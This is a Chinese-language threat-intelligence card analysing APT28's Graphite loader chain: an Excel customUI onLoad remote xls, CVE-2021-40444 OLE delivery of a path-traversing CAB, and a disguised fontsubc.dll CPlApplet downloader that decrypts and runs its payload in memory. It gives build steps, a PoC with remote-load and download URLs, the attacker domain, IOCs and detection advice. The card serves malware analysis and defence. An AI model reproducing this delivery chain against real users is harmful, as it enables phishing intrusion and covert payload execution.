---
id: code-analysis-reverse-windows-graphite-customui-40444-cab-cplapplet-loader
title: APT28 Graphite 前置加载链：Excel customUI onLoad 远程 xls + CVE-2021-40444 OLE 投递 CAB + CPlApplet DLL 下载器
type: scenario
domain: code-analysis
path: code-analysis/reverse/windows
technique: graphite-customui-40444-cab-cplapplet-loader
aliases:
- Graphite 加载链
- parliament.xlsx customUI
- CVE-2021-40444 投递
- fontsubc.dll
- CPlApplet 下载器
- URLOpenBlockingStreamW 下载
- DE47AC45 魔数
tags:
- apt28
- graphite
- windows
- office
- customui
- cve-2021-40444
- cab
- dll-loader
- xor
- rsa
cve:
- CVE-2021-40444
severity: high
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V423
  verified_at: '2026-11-09T17:11:05+08:00'
  notes: 已对照原文与28张图逐张核对：parliament.xlsx customUI.xml onLoad=https://wordkeyvpload.net/keys/parliament_rew.xls!123（图03-05，图04 WPS外连报错反证）、parliament_rew.xls OLEStream https://wordkeyvpload.net/keys/iz7hfd.html（图06）、1.cab→../cVgwet.inf 181248字节MSZip/PE32 DLL（图07）、fontsubc.dll 伪装 Font Subsetting DLL 10.0.19041.662 88.5KB（图08）、导出CPlApplet/DllEntryPoint（图09）、CoInitialize+URLOpenBlockingStreamW 下载 https://wordkeyvpload.net/keys/update.dat、XOR key byte_69A73DCC[i%0x1C]（图10）、CryptImportKey/RSA解密/SHA-256（图11）、MagicValue 45AC47DE（图12）、run_shellcode VirtualAlloc+memmove+call（图13）均一致。小瑕疵：'CPlApplet 可被 rundll32 一类方式调用'表述过宽（CPlApplet 通常由控制面板/control.exe 的 Control_RunDLL 加载 .cpl 时调用），建议改为'控制面板/Control_RunDLL 一类'。未验证点：PoC未复跑；中间HTML/JS样本缺失、CVE-2021-40444根因与完整PoC未复现（卡已注明，且不单独立CVE半链卡合理）。无sources/文章ID/长段摘录，path合法；dedup top1为自身，MSI/faultrep/office-macro 等候选非同链；dup-scan(11-08 19:10)早于建卡无pair。
---

## 一句话结论

APT28 Graphite 的第一、二阶段是一条 Office 投递链：钓鱼附件 `parliament.xlsx` 的 `customUI.xml` 用 `onLoad='https://.../parliament_rew.xls!123'` 让 Excel 去加载远程电子表格；第二份 xls 内嵌 OLE 对象/OLEStream 指向 HTML 地址，借助 CVE-2021-40444（MSHTML）在 IE 中解析该 HTML 并下载 CAB；CAB 以 `../cVgwet.inf` 路径解出伪装成 Microsoft `fontsubc.dll` 的下载器，其导出 `CPlApplet` 通过 COM + `URLOpenBlockingStreamW` 拉取 `update.dat`，XOR 解出 RSA 公钥、CryptoAPI 解密载荷、SHA-256 校验并检查魔数 `DE47AC45`，最后手工映射到内存执行 Graphite 主体。

## 原理

- **customUI onLoad 远程加载**：Office 的 `customUI.xml` 支持 `onLoad` 回调；样本把值写成远程 URL（`.../parliament_rew.xls!123`），Excel/WPS 处理 customUI 时会尝试访问该地址，从而在无宏的情况下取得第二份 xls。离线时 WPS 会弹“无法找到 https://.../parliament_rew.xls”的错误，反向印证了外连行为。
- **第二份 xls 的 OLE 对象**：`parliament_rew.xls` 内定义 OLE 对象/OLEStream，十六进制中可见 `https://.../iz7hfd.html` 一类 URL；文档打开后由 IE/MSHTML 解析该 HTML，触发 CVE-2021-40444（MSHTML 远程代码执行）。
- **CAB 与路径穿越**：CVE-2021-40444 的利用链下载 CAB，CAB 内的文件路径为 `../cVgwet.inf`，解压时越过目标目录；`cVgwet.inf` 实际是 PE32 DLL（181,248 字节，MSZip），即第二阶段的 `fontsubc.dll`。
- **伪装与导出**：`fontsubc.dll` 的版本信息伪装成 Microsoft Font Subsetting DLL（10.0.19041.662，88.5KB），导出 `CPlApplet` 与 `DllEntryPoint`；`CPlApplet` 是控制面板小程序的入口，可被 rundll32 一类方式调用，合法导出名降低可疑度。
- **下载与解密**：DLL 初始化 COM（`CoInitialize`），用 `URLOpenBlockingStreamW` 阻塞读取 `https://.../update.dat`；对数据做 XOR 解密（循环 key 来自 `byte_69A73DCC[i % 0x1C]`，表现为解出 RSA 公钥/密钥材料），再用 CryptoAPI `CryptImportKey` 导入 RSA 公钥 `CryptDecrypt` 解出载荷。
- **完整性与魔数校验**：解密后计算 SHA-256 与内置值比对；再检查前 4 字节是否为 `DE 47 AC 45`（小端 `0x45AC47DE`），不匹配则不执行，防止错误/篡改数据触发崩溃。
- **内存执行**：校验通过后 `VirtualAlloc`/`memmove` 手工映射载荷并调用入口（run_shellcode），不把 Graphite 主体落盘；后续主体即使用 OneDrive/Graph API 的 C2 模块。
- **链路完整性**：文章未拿到中间的 HTML/JS 样本，CVE-2021-40444 的利用细节未复现；但 customUI 外连、OLE URL、CAB 解包与 DLL 下载器行为均有截图/反编译佐证。

## 触发条件

- 受害者收到并打开钓鱼 Excel（`parliament.xlsx`），Office/WPS 允许 customUI 远程内容/外部链接。
- 第二份 xls 被打开，IE/MSHTML 按 CVE-2021-40444 解析恶意 HTML；目标 Office/Windows 版本受该漏洞影响。
- CAB 可写入目标目录并加载 DLL；DLL 能出网访问 `update.dat`。
- 攻击者服务器提供 xls、HTML、CAB 与 update.dat。

## 利用步骤

1. 构造 `parliament.xlsx`，在 `customUI.xml` 中设置 `onLoad` 为远程 xls 地址；邮件投递诱导打开。
2. 第二份 xls 内嵌 OLE 对象，OLEStream 指向 CVE-2021-40444 的 HTML；HTML 触发 MSHTML 漏洞并下载 CAB。
3. CAB 以 `../cVgwet.inf` 路径解出 `fontsubc.dll`；由 Office/IE 进程加载或由后续脚本调用 `CPlApplet`。
4. `CPlApplet` 初始化 COM，`URLOpenBlockingStreamW` 读取 `update.dat`；XOR 解出密钥材料，CryptoAPI RSA 解密 payload。
5. 校验 SHA-256 与 `DE47AC45` 魔数，手工映射并执行 Graphite 主体。
6. 分析侧：解包 xlsx（customUI.xml）、提取 xls 的 OLE 流 URL、解 CAB、反编译 DLL，提取 URL、XOR key、RSA 公钥与魔数作为 IOC。

## PoC

```text
customUI.xml：
<customUI xmlns="http://schemas.microsoft.com/office/2006/01/customui"
          onLoad='https://<payload-host>/keys/parliament_rew.xls!123'>
</customUI>

第二份 xls 的 OLEStream 中可见：
  https://<payload-host>/keys/iz7hfd.html

CAB：
  1.cab -> ../cVgwet.inf (PE32 DLL, 181248 bytes)

DLL：
  导出 CPlApplet
  URL https://<payload-host>/keys/update.dat
  XOR key: byte_69A73DCC[i % 0x1C]
  魔数：DE 47 AC 45
```

```text
分析命令（隔离环境）：
  unzip -o parliament.xlsx customUI/customUI.xml
  cabextract 1.cab
  diec cVgwet.inf / strings -el fontsubc.dll
```

## 变体与关联

- customUI 的 `onLoad` 也可指向 WebDAV/UNC 路径；远程内容可能被缓存到本地，需结合 Office 信任中心设置。
- CVE-2021-40444 的 HTML/JS 可换成其它 MSHTML/Office 漏洞；CAB 路径穿越是常见落地手法。
- 下载器可换 `InternetOpenUrl`/WinHTTP/COM 流；RSA 公钥解密 + SHA-256 + 魔数校验是防误触发的常见组合。
- 关联：[[pentest-initial-access-office-macro-document]]（Office 宏/漏洞投递总览，提及 CVE-2021-40444）、[[pentest-c2-reflective-dll-remote-injection-marker-loader]]（URLOpenBlockingStream 远程 DLL 注入）、[[pentest-c2-graphite-graph-api-onedrive-file-c2]]（同篇 Graphite 的 OneDrive C2 协议）。

## 检测与防御

- **Office 侧**：禁用/限制 customUI 外部内容与“受保护的视图”外链；及时修补 CVE-2021-40444 及后续 MSHTML 漏洞；阻止 Office 进程直接访问陌生域名。
- **主机侧**：监控 Office/IE 进程落盘 CAB 并解压出 DLL/INF；`rundll32` 调用 `CPlApplet`；DLL 版本信息与文件名不符；`URLOpenBlockingStreamW` 访问陌生域名。
- **文件/内存**：YARA 匹配 `DE 47 AC 45` 魔数、互斥体 `250gHJAWUI289382s3h3Uasuh289di`、Graphite 字符串；内存扫描无文件 DLL。
- **网络**：封锁文章 IOC 域名/IP，监控 `update.dat` 一类随机文件下载；邮件网关拦截带 external customUI/远程模板的 xlsx。
